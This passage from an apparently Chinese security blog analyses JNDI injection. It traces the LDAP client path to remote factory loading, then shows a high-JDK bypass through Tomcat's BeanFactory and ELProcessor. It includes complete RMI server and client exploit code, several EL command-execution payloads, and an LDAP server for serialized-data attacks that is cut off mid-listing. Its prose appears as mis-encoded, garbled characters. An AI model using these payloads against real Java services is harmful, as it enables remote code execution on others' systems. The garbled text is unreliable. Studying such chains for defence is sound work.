<p>åŒºåˆ«äºrmiseverï¼Œldapseverå°±æœ‰ä¸€äº›å¤æ‚äº†ï¼Œå› ä¸ºæ­å»ºä¸€ä¸ªå†…å­˜ä¸­çš„ LDAP æœåŠ¡å™¨ï¼Œä¸è¿‡ä¹Ÿå°±æ˜¯<code>config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</code>è®¾ç½®æ‹¦æˆªå™¨æ‹¦æˆªLDAP è¯·æ±‚ç„¶åé€šè¿‡sendResultè¿”å›Reference Factoryï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¸»è¦è°ƒè¯•clientç«¯ã€‚</p>
<p><img src="/images/77ceec62f19bb233bd3d71434fe6b8db.png"></p>
<h2 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h2><h4 id="lookup-3"><a href="#lookup-3" class="headerlink" title="lookup"></a>lookup</h4><p>é¦–å…ˆè‚¯å®šè¿˜æ˜¯<code>getURLOrDefaultInitCtx</code>è¿›åˆ°LDAPçš„ä¸Šä¸‹æ–‡å¯¹è±¡è°ƒç”¨å…¶<code>lookup</code>æ–¹æ³•</p>
<p><img src="/images/d2fd2a9ebfcfc2fc948bcd3cfe81be8d.png"></p>
<p>æœ€åä¸€ä½ä¸èƒ½æ˜¯<code>?</code></p>
<p><img src="/images/0d61328a3bf85f179e09b44bdf7af404.png"></p>
<p>ç„¶åæ˜¯ç›¸ä¼¼çš„lookup,è¿˜æ˜¯å…ˆ<code>getRootURLContext</code>ï¼Œè·Ÿè¿›å»</p>
<p><img src="/images/3b2b3a2078c01ab75363aa7a0dfa15ab.png"></p>
<h5 id="getRootURLContext-1"><a href="#getRootURLContext-1" class="headerlink" title="getRootURLContext"></a>getRootURLContext</h5><p>è¿™é‡Œæ¯”è¾ƒä¸åŒäº†ï¼Œä½†è¿™ä¸ªæ–¹æ³•çš„ç›®çš„è¿˜æ˜¯åˆ›å»ºä¸Šä¸‹æ–‡ï¼Œå°è£…ç±»åä»¥è¿”å›ç»™lookupä»¥è¿›è¡Œä¸‹ä¸€æ­¥è·å–è¿œç¨‹Referenceç±»çš„æ“ä½œã€‚</p>
<p><img src="/images/fc93ee17bdc38590f4d5a5fcd5119349.png"></p>
<h6 id="getUsingURLIgnoreRootDN"><a href="#getUsingURLIgnoreRootDN" class="headerlink" title="getUsingURLIgnoreRootDN"></a>getUsingURLIgnoreRootDN</h6><p><code>getUsingURLIgnoreRootDN</code>ä¸»è¦æ˜¯æŠŠç”¨<code>LdapURL</code>è§£ældapurlï¼Œç„¶ååˆ›å»ºLdapCtxä¸Šä¸‹æ–‡ï¼Œå†æŠŠç±»årefå°è£…è¿›CompositeNameï¼Œæœ€åResolveResultå°è£…ä¸¤ä¸ªå¯¹è±¡è¿”å›ã€‚</p>
<p><img src="/images/227147d5b7e7f626fa7ba69736e7b353.png"></p>
<h4 id="lookup-4"><a href="#lookup-4" class="headerlink" title="lookup"></a>lookup</h4><p>ç„¶åå›åˆ°lookupï¼Œè¿›å…¥LDAPcontextçš„lookupæ“ä½œ</p>
<p><img src="/images/f593cc160fbc40e577ccbf4e333aa70c.png"></p>
<h5 id="lookup-5"><a href="#lookup-5" class="headerlink" title="lookup"></a>lookup</h5><p>è¿™ä¸ªlookupæ¯”è¾ƒå¤æ‚ï¼Œå‰é¢å…ˆå°è£…ä¸€ä¸‹ç”¨åˆ°çš„å¯¹è±¡ï¼Œç¬¬äºŒå—ä¸»è¦æ˜¯æŒç»­è§£æï¼Œæ¯”å¦‚è¯´</p>
<p><code>ctx.lookup(&quot;ldap://example.com:1099/ou=users,dc=example,dc=com&quot;)</code></p>
<p>ä»–ä¼šå¾ªç¯è§£æåµŒå¥—çš„contextç»“æ„ï¼Œç¬¬ä¸‰å—ä¼šå¤„ç†é‡å®šå‘ï¼Œä½†å…¶å®æ¶æ„ç±»åŠ è½½è¿˜æ˜¯åœ¨<code>p_lookup</code>é‡Œ</p>
<p><img src="/images/ed2148d49a2036f1aae0b6562a0e7f5d.png"></p>
<h6 id="p-lookup"><a href="#p-lookup" class="headerlink" title="p_lookup"></a>p_lookup</h6><p>å…ˆæŠŠvar1å’Œvar2ä¸€èµ·æ‹†æˆå¤´éƒ¨å’Œå°¾éƒ¨ï¼Œå¦‚æœè·¯å¾„æ˜¯ <code>&quot;dc=example,dc=com&quot;</code>ï¼Œè§£ææˆï¼š</p>
<ul>
<li><code>Head</code> â†’ <code>&quot;dc=example&quot;</code></li>
<li><code>Tail</code> â†’ <code>&quot;dc=com&quot;</code></li>
</ul>
<p>ä½†æ˜¯å•æ˜¯refçš„è¯æ˜¯ï¼š</p>
<ul>
<li><code>Head</code> â†’ <code>&quot;ref&quot;</code></li>
<li><code>Tail</code> â†’ <code>&quot;&quot;</code></li>
</ul>
<p>è¿›å…¥case 2å—</p>
<p><img src="/images/8d9092733364ab4764fb67a9c5520922.png"></p>
<h6 id="c-lookup"><a href="#c-lookup" class="headerlink" title="c_lookup"></a>c_lookup</h6><p>å…ˆæ˜¯è¿›è¡Œäº†LDAPæŸ¥è¯¢ï¼Œå¦‚æœä¸æˆåŠŸåˆ™<code>processReturnCode</code>å¤„ç†è¿”å›çš„é”™è¯¯ä»£ç </p>
<p><img src="/images/33065fd05fe845f846b35ef3552bdef0.png"></p>
<p>ä¹Ÿæ˜¯è·å–åˆ°äº†æˆ‘ä»¬çš„æ¶æ„Ldapç»“æœï¼ˆåç»­è¢«è§£ææˆæ¶æ„Refrenceç±»ï¼‰</p>
<p><img src="/images/ecb34c94b432792318214218c3ad1878.png"></p>
<ul>
<li>å¦‚æœæŸ¥è¯¢è¿”å›äº†ä¸€ä¸ªæ¡ç›®ï¼Œåˆ™ä» <code>var23.entries</code> è·å–ç¬¬ä¸€ä¸ªæ¡ç›®ã€‚</li>
<li><code>var25.attributes</code> å–å‡ºè¯¥æ¡ç›®çš„å±æ€§ã€‚</li>
<li>å¦‚æœæ¡ç›®æœ‰å“åº”æ§åˆ¶ä¿¡æ¯ï¼ˆ<code>respCtls</code>ï¼‰ï¼Œå°†å®ƒä»¬è¿½åŠ åˆ°å½“å‰çš„å“åº”æ§åˆ¶ä¸­ã€‚</li>
</ul>
<p><img src="/images/80be4233c44618f0bef965207187ec9c.png"></p>
<p>ç»ˆäºæ¥åˆ°æ¿€åŠ¨äººå¿ƒçš„decodeObjectç¯èŠ‚äº†ï¼Œå…ˆæ˜¯åˆ¤æ–­var4å¯¹è±¡æœ‰æ²¡æœ‰<code>Obj.JAVA_ATTRIBUTES[2]</code>(javaClassName)å±æ€§ï¼Œæœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ã€‚</p>
<p><img src="/images/e02da44a8632f37d82e4f5e98acb3447.png"></p>
<p><img src="/images/580c35600777e3071f0db4ed93d224ec.png"></p>
<h6 id="decodeObject"><a href="#decodeObject" class="headerlink" title="decodeObject"></a>decodeObject</h6><p>var2å…ˆå–å‡ºcodeBase</p>
<p>ç„¶åä¾æ¬¡çœ‹LDAPç»“æœä¸­æœ‰æ²¡æœ‰javaSerializedDataã€javaRemoteLocationã€objectClassï¼Œåˆ†åˆ«æ‰§è¡Œä¸åŒæ“ä½œï¼Œå¯ä»¥ååºåˆ—åŒ–ï¼ˆåé¢çš„é«˜ç‰ˆæœ¬ç»•è¿‡â€¦ï¼‰ï¼ŒåŠ è½½rmiå¯¹è±¡ï¼ˆæ˜¯ä¸æ˜¯åˆå¯ä»¥æ‰“rmiçš„JNDIäº†â€¦åˆ«æ‰“ï¼‰ï¼ŒåŠ è½½è¿œç¨‹ç±»ã€‚</p>
<p>è¿™æ¬¡æ˜¯ç¬¬ä¸‰ç§ï¼š</p>
<p>objectClassæ˜¯javaNamingReferenceçš„è¯å°±è§£æå‡ºæˆ‘ä»¬çš„æ¶æ„Referenceç±»ï¼ŒåŒ…çš„åŒ…çš„</p>
<p><img src="/images/3cfd780370368f07e8974a581d455376.png"></p>
<h6 id="decodeReference"><a href="#decodeReference" class="headerlink" title="decodeReference"></a>decodeReference</h6><p><img src="/images/1bd5f236bbb290c2e62c38b2a1358b64.png"></p>
<p>æ¯”è¾ƒç®€å•ç²—æš´åœ°è¿˜åŸäº†Referenceç±»ï¼Œç„¶åç›´æ¥return</p>
<h6 id="c-lookup-1"><a href="#c-lookup-1" class="headerlink" title="c_lookup"></a>c_lookup</h6><p>åˆå›åˆ°äº†c_lookup</p>
<p>å®Œäº‹ç«Ÿç„¶ç›´æ¥getObjectInstanceäº†ï¼Ÿæˆ‘ä»¬æ˜æ˜è¿˜æ²¡ä»Referenceè¿˜åŸå‡ºå·¥å‚ç±»å•Šï¼Ÿå…¶å®è¿™é‡ŒæŠŠä¸¤ä¸ªè¿‡ç¨‹å°è£…è¿›ä¸€ä¸ªæ–¹æ³•ä¸­äº†ï¼Œè¿›å»çœ‹çœ‹</p>
<p><img src="/images/b9eb9193e084a8f0fc5a042bc80431ba.png"></p>
<h6 id="getObjectInstance"><a href="#getObjectInstance" class="headerlink" title="getObjectInstance"></a>getObjectInstance</h6><p>æ³ªç›®äº†ï¼Œç»ˆäºæ‰¾åˆ°äº†ï¼Œè¿™é‡Œå°±å’Œrmiçš„æ¯”è¾ƒç›¸ä¼¼äº†ï¼Œå…ˆä»Referenceè¿˜åŸæ¶æ„å·¥å‚ç±»ï¼Œç„¶åè°ƒç”¨å…¶æ„é€ æ–¹æ³•å°±èƒ½RCEäº†ã€‚</p>
<p><img src="/images/006d07d1f022f3b61f03feaf8ebd9dca.png"></p>
<p>ç¡®å®ï¼Œæ€»ä½“è¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ã€‚</p>
<h2 id="é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šç”¨æœ¬åœ°Classå½“Reference-Factory"><a href="#é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šç”¨æœ¬åœ°Classå½“Reference-Factory" class="headerlink" title="é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šç”¨æœ¬åœ°Classå½“Reference Factory"></a>é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šç”¨æœ¬åœ°Classå½“Reference Factory</h2><blockquote>
<p>åœ¨é«˜ç‰ˆæœ¬ä¸­ï¼ˆå¦‚ï¼šJDK8u191ä»¥ä¸Šç‰ˆæœ¬ï¼‰è™½ç„¶ä¸èƒ½ä»è¿œç¨‹åŠ è½½æ¶æ„çš„Factoryï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åœ¨è¿”å›çš„Referenceä¸­æŒ‡å®šFactory Classï¼›</p>
</blockquote>
<p>ä½†æ˜¯è‚¯å®šæœ‰å¦‚ä¸‹è¦æ±‚</p>
<ul>
<li>è¿™ä¸ªå·¥å‚ç±»å¿…é¡»åœ¨å—å®³ç›®æ ‡æœ¬åœ°çš„CLASSPATHä¸­</li>
<li>å·¥å‚ç±»å¿…é¡»å®ç° javax.naming.spi.ObjectFactory æ¥å£</li>
<li>è‡³å°‘å­˜åœ¨ä¸€ä¸ª getObjectInstance() æ–¹æ³•</li>
</ul>
<h3 id="tomcat8-5-0"><a href="#tomcat8-5-0" class="headerlink" title="tomcat8.5.0"></a>tomcat8.5.0</h3><p><code>org.apache.naming.factory.BeanFactory</code> å­˜åœ¨äºTomcatä¾èµ–åŒ…ä¸­ï¼Œæ‰€ä»¥ä½¿ç”¨ä¹Ÿæ˜¯éå¸¸å¹¿æ³›ã€‚ è¯¥ç±»åœ¨ getObjectInstance() ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteræ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäºReferenceå¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚</p>
<p>javax.el.ELProcessoræ˜¯ç”±evalæ–¹æ³•çš„Bean Classï¼Œä½†æ€ä¹ˆè°ƒç”¨å‘¢ï¼Ÿ</p>
<p>äº‹å®ä¸Šè°ƒç”¨çš„setterä¸ä¸€å®šéœ€è¦æ˜¯set..å¼€å¤´çš„æ–¹æ³•ï¼Œæ ¹æ®org.apache.naming.factory.BeanFactoryä¸­çš„é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæŸä¸ªæ–¹æ³•å¼ºåˆ¶æŒ‡å®šä¸ºsetterã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref.add(new StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(new StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±ä¼šè°ƒç”¨<code>eval(&quot;&quot;\&quot;.getClass().for...&quot;)</code></p>
<p>demo:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//pom.xmlï¼ˆåŒæ–¹å‡éœ€è¦ï¼‰</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.el&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;com.springsource.org.apache.el&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">7.0</span><span class="number">.26</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//server</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">rmiserver1</span> &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        InitialContext ctx = new InitialContext(env);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        ResourceRef ref = new ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, null, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, true, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, null);</span><br><span class="line">        ref.add(new StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(new StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);</span><br><span class="line">        ctx.bind(<span class="string">&quot;ref&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/ref&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡ ç§å˜ä½“è¡¨è¾¾å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc1</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.newInstance().getEngineByName(&#x27;nashorn&#x27;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc2</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass())&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc3</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.newInstance().getEngineByName(&#x27;JavaScript&#x27;)&quot;</span> +</span><br><span class="line">        <span class="string">&quot;.eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ELProcessor</span>().eval(poc1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è°ƒè¯•è¿‡ç¨‹ï¼š-1"><a href="#è°ƒè¯•è¿‡ç¨‹ï¼š-1" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹ï¼š"></a>è°ƒè¯•è¿‡ç¨‹ï¼š</h4><p>ä¸»è¦æ˜¯å®ä¾‹åŒ–è¿œç¨‹å·¥å‚ç±»BeanFactoryä¹‹åï¼Œè°ƒç”¨å…¶getObjectInstanceæ–¹æ³•ï¼Œæ­¤æ—¶çš„BeanFactoryæ›´åƒæ˜¯ä¸ºäº†æ–¹ä¾¿è¿˜åŸBean Classå¯¹è±¡ï¼ˆå› ä¸ºæ²¡æœ‰è¿›è¡Œè¿œç¨‹åŠ è½½ç±»ï¼‰ï¼Œè€Œè¿›è¡Œçš„å°è£…ï¼Œæœ€åé€šè¿‡getObjectInstanceè¿˜åŸæˆ‘ä»¬æœ¬æ¥éœ€è¦çš„Bean Classã€‚<img src="/images/4947e32769ff1163ab23bd84ddc793fa.png"></p>
<p>ç›´æ¥è¿›getObjectInstanceï¼Œè¿™æ˜¯å…ˆæŠŠBeanClassåŠ è½½å‡ºæ¥</p>
<p><img src="/images/a327401467d879dcce864f701db0558f.png"></p>
<p>ç„¶åloadæˆåŠŸè¿›elseå—</p>
<p>å…ˆå–å‡ºforceStringå†…å®¹ï¼Œç„¶åå¦‚æœæœ‰å¤šä¸ªåˆ™é€šè¿‡é€—å·åˆ†éš”å–å‡ºï¼Œå¦‚æœæœ‰ç­‰å·å†åˆ†åˆ«å–å‡ºå˜é‡å’Œå€¼ï¼Œæœ€åæŠŠä»¥å˜é‡åä¸ºé”®ï¼Œæ–¹æ³•ä¸ºå€¼å­˜å…¥forcedé‡Œé¢ç­‰ä¼šå†ä½¿ç”¨</p>
<p><img src="/images/770eb3cadc81aaee41d2f89606acb011.png"></p>
<p>å†å–å‡ºå…¶ä»–æ‰€æœ‰å†…å®¹ï¼ŒæŒ¨ä¸ªéå†ï¼Œæ’é™¤ä¸€äº›å¹¶å‘ç”¨äºsetterå±æ€§ï¼Œæœ€ååˆ°æˆ‘ä»¬çš„<code>x=</code></p>
<p><img src="/images/834447f46c06ab82bf443f1a1782a758.png"></p>
<p>ç„¶åç›´æ¥å–å‡ºforcedä¸­ç´¢å¼•ä¸º<code>x</code>çš„methodä¼ å…¥valueè°ƒç”¨ï¼Œä»è€ŒRCEã€‚</p>
<p><img src="/images/1538f64fce911888a602cc5fc93e8a05.png"></p>
<p>ä¸»è¦æ˜¯forcestringé‡Œæœ‰ç­‰å·æ—¶æ”¯æŒè‡ªå®šä¹‰æ–¹æ³•åï¼Œè€Œä¸æ˜¯åƒæ— ç­‰å·æ—¶é»˜è®¤æ˜¯setXxxï¼Œä»è€Œèƒ½ç”¨evalæ–¹æ³•æ‰§è¡Œvalueã€‚</p>
<h2 id="é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget"><a href="#é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget" class="headerlink" title="é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget"></a>é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapserver1</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:1234/#Evil&quot;</span>;</span><br><span class="line">        <span 